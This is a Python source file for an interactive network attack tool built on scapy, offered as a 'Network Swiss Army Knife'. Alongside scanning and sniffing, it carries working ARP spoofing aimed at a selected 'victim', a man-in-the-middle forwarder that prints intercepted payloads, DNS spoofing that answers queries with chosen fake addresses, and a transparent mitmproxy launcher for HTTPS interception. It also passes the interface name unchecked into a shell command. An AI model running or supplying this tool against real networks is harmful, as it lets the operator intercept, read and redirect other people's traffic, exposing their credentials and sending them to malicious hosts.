import os
import sys
import time
import csv
import subprocess
import logging
from tabulate import tabulate
from scapy.all import (
    sniff, ARP, DNS, DNSQR, DNSRR, TCP, Raw, Ether, srp, send, sendp, IP, UDP, get_if_list
)
import requests

# ------------- Logging -------------
logging.basicConfig(filename='network_tool.log',
    format='%(asctime)s [%(levelname)s] %(message)s',
    level=logging.INFO
)

# ---------- Optional Color Output ----------
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    class FakeColor: RESET = RED = GREEN = YELLOW = BLUE = CYAN = MAGENTA = ""
    Fore = Style = FakeColor()

# ---------- Vendor List Management ----------
import json
local_vendor_path = "vendors.json"
local_vendors = {
    "B0A7B9": "Huawei", "34E6AD": "Dell", "24181D": "Apple", "7A2487": "Samsung",
    "FCA667": "Xiaomi", "D850E6": "Cisco", "A4B197": "TP-Link", "E09153": "Intel"
}
if os.path.exists(local_vendor_path):
    try:
        with open(local_vendor_path, 'r', encoding='utf-8') as f:
            local_vendors.update(json.load(f))
    except Exception as e:
        logging.warning(f"Vendor file error: {e}")

devices = []

# ---------- Permission & Interface Checks ----------
def check_root():
    if os.name != "nt" and hasattr(os, 'geteuid') and os.geteuid() != 0:
        print(Fore.RED + "[X] Please run this script with sudo/root privileges!")
        sys.exit(1)
    elif os.name == "nt":
        print(Fore.YELLOW + "[!] It is recommended to run this script as Administrator (for better functionality).")

def choose_interface():
    ifaces = get_if_list()
    print(Fore.CYAN + "Available interfaces:")
    for i, iface in enumerate(ifaces):
        print(f"  {i+1}. {iface}")
    while True:
        val = input(Fore.YELLOW + "Enter the interface number: ").strip()
        try:
            idx = int(val)-1
            if 0 <= idx < len(ifaces):
                # Extra check for interface up/down (UNIX-only, best effort)
                if os.name != "nt" and not is_interface_up(ifaces[idx]):
                    print(Fore.RED + "[X] The selected interface is DOWN!")
                    continue
                return ifaces[idx]
        except Exception as e:
            pass
        print(Fore.RED + "Enter a valid number.")

def is_interface_up(iface):
    try:
        return os.system(f"ip link show {iface} | grep 'state UP' > /dev/null") == 0
    except Exception:
        return True  # Fallback: assume up on non-UNIX

# ---------- Vendor Lookup ----------
def get_vendor(mac):
    mac_clean = mac.upper().replace(":", "")
    oui = mac_clean[:6]
    if oui in local_vendors:
        return local_vendors[oui]
    try:
        response = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
        if response.status_code == 200 and response.text.strip():
            vendor = response.text.strip()
            # cache to json for future!
            local_vendors[oui] = vendor
            try:
                with open(local_vendor_path, "w", encoding='utf-8') as f:
                    json.dump(local_vendors, f, indent=2)
            except Exception as e:
                logging.warning(f"Could not update vendor file: {e}")
            return vendor
    except requests.RequestException as e:
        logging.warning(f"Vendor API error: {e}")
    return "🤔 Possibly Unknown Vendor"

# ---------- MAC Retrieval ----------
def get_mac(ip, iface):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, verbose=0)
        if ans:
            return ans[0][1].hwsrc
    except Exception as e:
        logging.warning(f"Could not get MAC for {ip}: {e}")
        print(Fore.RED + f"[!] Could not get MAC for {ip}: {e}")
    return None

# ---------- Output Devices Table ----------
def print_devices_table(devices_list):
    headers = ["No.", "IP", "MAC", "Vendor"]
    table = []
    for i, (ip, mac) in enumerate(devices_list, 1):
        table.append([i, ip, mac, get_vendor(mac)])
    print(Fore.CYAN + tabulate(table, headers, tablefmt="fancy_grid"))

# ---------- Save to CSV ----------
def save_scan_to_csv(devices_list, filename="scan_result.csv"):
    try:
        with open(filename, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(["IP", "MAC", "Vendor"])
            for ip, mac in devices_list:
                writer.writerow([ip, mac, get_vendor(mac)])
        print(Fore.GREEN + f"[✓] Scan results saved to {filename}")
        logging.info(f"Scan results saved to {filename}")
    except Exception as e:
        print(Fore.RED + f"[X] Save error: {e}")
        logging.error(f"Save CSV error: {e}")

# ---------- MITMProxy ----------
def start_mitmproxy():
    print(Fore.MAGENTA + "\n[!] Starting MITMProxy... (for HTTPS sniffing)")
    print("If not installed:", Fore.YELLOW + "pip install mitmproxy")
    print("You must install the mitmproxy CA certificate on the victim device! (See: https://docs.mitmproxy.org/stable/concepts-certificates/ )")
    try:
        subprocess.Popen(['mitmproxy', '--mode', 'transparent', '--showhost'])
        print(Fore.GREEN + "[✓] MITMProxy started. Redirect the victim's traffic to this system using ARP Spoof!")
    except FileNotFoundError:
        print(Fore.RED + "[X] mitmproxy not found! Please install it using the above command.")
    except Exception as e:
        print(Fore.RED + "[X] Error running MITMProxy:", e)
        logging.error(f"MITMProxy Error: {e}")

# ---------- Passive Sniffer ----------
def passive_sniffer():
    print(Fore.BLUE + "\n[+] Sniffer Mode")
    iface = choose_interface()
    print("Choose filter:\n  1. ARP\n  2. DNS\n  3. TCP\n  4. HTTP\n  5. All")
    choice = input(Fore.YELLOW + "Enter choice (1-5): ").strip()
    packet_count = input(Fore.YELLOW + "Max packets to sniff (e.g., 200 or press Enter for unlimited): ").strip()
    try:
        packet_count = int(packet_count) if packet_count else 0
    except: packet_count = 0
    def packet_callback(packet):
        try:
            if choice == "1" and packet.haslayer(ARP):
                print(Fore.GREEN + "[ARP] ", packet.summary())
            elif choice == "2" and packet.haslayer(DNS):
                print(Fore.GREEN + "[DNS] ", packet.summary())
            elif choice == "3" and packet.haslayer(TCP):
                print(Fore.GREEN + "[TCP] ", packet.summary())
            elif choice == "4":
                if packet.haslayer(TCP) and packet.haslayer(Raw):
                    payload = packet[Raw].load
                    try:
                        decoded = payload.decode(errors='ignore')
                        if "HTTP" in decoded or decoded.startswith("GET") or decoded.startswith("POST"):
                            print(Fore.YELLOW + "[HTTP] ", decoded)
                    except Exception:
                        pass
            elif choice == "5":
                print(Fore.CYAN + "[ALL] ", packet.summary())
        except Exception as e:
            print(Fore.RED + f"[!] Error in callback: {e}")
            logging.error(f"Sniffer callback error: {e}")
    print(Fore.CYAN + "[*] Sniffing... Ctrl+C to stop.")
    try:
        sniff(prn=packet_callback, iface=iface, store=0, count=packet_count if packet_count > 0 else 0)
    except Exception as e:
        print(Fore.RED + f"[X] Sniffing error: {e}")
        logging.error(f"Sniffing error: {e}")

# ---------- Network Scan ----------
def network_scan():
    print(Fore.BLUE + "\n[+] Network Scan Mode")
    iface = choose_interface()
    target_ip = input(Fore.YELLOW + "Enter target IP range (e.g., 192.168.1.0/24): ").strip()
    if not target_ip:
        print(Fore.RED + "[X] No IP range provided!")
        return
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    print(Fore.CYAN + "[*] Scanning network... Please wait.")
    try:
        result = srp(packet, timeout=3, iface=iface, verbose=0)[0]
    except Exception as e:
        print(Fore.RED + f"[X] Scan error: {e}")
        logging.error(f"Scan error: {e}")
        return
    devices.clear()
    for sent, received in result:
        ip = received.psrc
        mac = received.hwsrc
        devices.append((ip, mac))
    if devices:
        print_devices_table(devices)
        if input(Fore.YELLOW + "Save results to CSV? (y/n): ").strip().lower() == "y":
            save_scan_to_csv(devices)
    else:
        print(Fore.RED + "[X] No device found.")

# ---------- ARP Spoofing ----------
def arp_spoofing():
    print(Fore.BLUE + "\n[+] ARP Spoofing Mode")
    if not devices:
        print(Fore.RED + "[-] No device list found! Please scan the network first.")
        return
    print_devices_table(devices)
    choice = input(Fore.YELLOW + "Select victim number (or Enter to input manually): ").strip()
    if choice:
        try:
            idx = int(choice) - 1
            target_ip, victim_mac = devices[idx]
        except:
            print(Fore.RED + "Invalid selection.")
            return
        print(Fore.GREEN + f"[+] Selected Victim: {target_ip} - {victim_mac}")
    else:
        target_ip = input("Enter Target IP (victim): ")
        victim_mac = input("Enter Victim MAC address: ")
    gateway_ip = input("Enter Gateway IP (router): ")
    iface = choose_interface()
    if not victim_mac:
        print(Fore.RED + "[X] Victim MAC address not found!")
        return
    def spoof(target_ip, spoof_ip, victim_mac):
        ether = Ether(dst=victim_mac)
        arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=victim_mac)
        packet = ether / arp
        sendp(packet, iface=iface, verbose=0)
        print(Fore.YELLOW + f"[+] Spoofed {target_ip} ({victim_mac}) claiming to be {spoof_ip}")
    try:
        print(Fore.CYAN + "Attack started... Ctrl+C to stop.")
        while True:
            spoof(target_ip, gateway_ip, victim_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.GREEN + "\n[!] Stopped")

# ---------- MITM Packet Forwarder ----------
def mitm_forwarder():
    print(Fore.BLUE + "\n[+] MITM Packet Forwarder Mode")
    iface = choose_interface()
    if not devices:
        print(Fore.RED + "[-] No device list found! Please scan the network first.")
        return
    print_devices_table(devices)
    choice = input(Fore.YELLOW + "Select victim number (or Enter to input manually): ").strip()
    if choice:
        try:
            idx = int(choice) - 1
            victim_ip, victim_mac = devices[idx]
        except:
            print(Fore.RED + "Invalid selection.")
            return
        print(Fore.GREEN + f"[+] Selected Victim: {victim_ip} - {victim_mac}")
    else:
        victim_ip = input("Enter Victim IP: ")
    router_ip = input("Enter Router IP: ")
    def forward_packet(packet):
        if packet.haslayer(IP):
            ip_layer = packet[IP]
            # Remove checksums for both layers
            if hasattr(ip_layer, 'chksum'):
                del ip_layer.chksum
            if packet.haslayer(TCP) and hasattr(packet[TCP], 'chksum'):
                del packet[TCP].chksum
            if packet.haslayer(UDP) and hasattr(packet[UDP], 'chksum'):
                del packet[UDP].chksum
            if packet.haslayer(Raw):
                try:
                    payload = packet[Raw].load
                    decoded = payload.decode(errors='ignore')
                    print(Fore.YELLOW + f"\n[PAYLOAD]\n{decoded}\n")
                except Exception:
                    pass
            dst_mac = None
            msg = ""
            if ip_layer.src == victim_ip:
                ip_layer.dst = router_ip
                dst_mac = get_mac(router_ip, iface)
                msg = f"[→] {victim_ip} → {router_ip}"
            elif ip_layer.src == router_ip:
                ip_layer.dst = victim_ip
                dst_mac = get_mac(victim_ip, iface)
                msg = f"[←] {router_ip} → {victim_ip}"
            if not dst_mac:
                print(Fore.RED + "[X] Destination MAC not found! Forwarding not possible.")
                return
            ether = Ether(dst=dst_mac)
            try:
                new_pkt = ether / ip_layer / packet.payload
                sendp(new_pkt, iface=iface, verbose=0)
                print(Fore.GREEN + msg)
            except Exception as e:
                print(Fore.RED + f"[X] Packet forward error: {e}")
                logging.error(f"Packet forward error: {e}")
    print(Fore.CYAN + "[*] Sniffing and forwarding packets. Ctrl+C to stop.")
    try:
        sniff(filter=f"ip host {victim_ip} or {router_ip}", prn=forward_packet, iface=iface, store=0)
    except Exception as e:
        print(Fore.RED + f"[X] Sniff error: {e}")
        logging.error(f"MITM Forward error: {e}")

# ---------- DNS Spoofing ----------
def dns_spoofing():
    print(Fore.BLUE + "\n[+] DNS Spoofing Mode")
    iface = choose_interface()
    print("Enter fake domains with IP (e.g., google.com 192.168.1.123) or leave empty to finish:")
    spoofed_domains = {}
    while True:
        entry = input("Domain IP> ").strip()
        if not entry: break
        try:
            domain, ip = entry.split()
            if not domain.endswith('.'): domain += '.'
            spoofed_domains[domain] = ip
        except:
            print(Fore.RED + "Wrong format. Example: google.com 1.2.3.4")
    if not spoofed_domains:
        print(Fore.RED + "No fake domains entered. Exiting...")
        return
    def dns_spoof(pkt):
        if pkt.haslayer(DNSQR):
            queried = pkt[DNSQR].qname.decode()
            if queried in spoofed_domains:
                print(Fore.MAGENTA + f"[DNS-SPOOF] Spoofing {queried} → {spoofed_domains[queried]}")
                try:
                    spoof_pkt = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                                    UDP(dport=pkt[UDP].sport, sport=53) /
                                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                        an=DNSRR(rrname=queried, rdata=spoofed_domains[queried])))
                    send(spoof_pkt, verbose=0)
                except Exception as e:
                    print(Fore.RED + f"[X] DNS Spoof error: {e}")
                    logging.error(f"DNS Spoof error: {e}")
    print(Fore.CYAN + "[*] DNS Spoofing started. Ctrl+C to stop.")
    try:
        sniff(filter="udp port 53", prn=dns_spoof, iface=iface, store=0)
    except Exception as e:
        print(Fore.RED + f"[X] Sniff error: {e}")
        logging.error(f"DNS Spoof sniff error: {e}")

# ---------- Main Menu ----------
def main_menu():
    check_root()
    while True:
        print(Fore.CYAN + "\n====== Network Swiss Army Knife ======" + Style.RESET_ALL)
        print(Fore.YELLOW +
                "1. Passive Sniffer\n"
                "2. Network Scan (ARP)\n"
                "3. Save Last Network Scan to CSV\n"
                "4. ARP Spoofing (MITM)\n"
                "5. MITM Packet Forwarder\n"
                "6. DNS Spoofing\n"
                "7. HTTPS Sniff (with MITMProxy)\n"
                "0. Exit" + Style.RESET_ALL)
        action = input(Fore.BLUE + "Enter your choice: ").strip()
        try:
            if action == "1": passive_sniffer()
            elif action == "2": network_scan()
            elif action == "3":
                if devices:
                    save_scan_to_csv(devices)
                else:
                    print(Fore.RED + "You need to perform a network scan first!")
            elif action == "4": arp_spoofing()
            elif action == "5": mitm_forwarder()
            elif action == "6": dns_spoofing()
            elif action == "7": start_mitmproxy()
            elif action == "0":
                print(Fore.CYAN + "Bye! 🌙")
                break
            else:
                print(Fore.RED + "Invalid choice.")
        except KeyboardInterrupt:
            print(Fore.GREEN + "\n[!] Interrupted by user.")
        except Exception as e:
            print(Fore.RED + f"[X] Error: {e}")
            logging.error(f"Main menu error: {e}")

if __name__ == "__main__":
    main_menu()
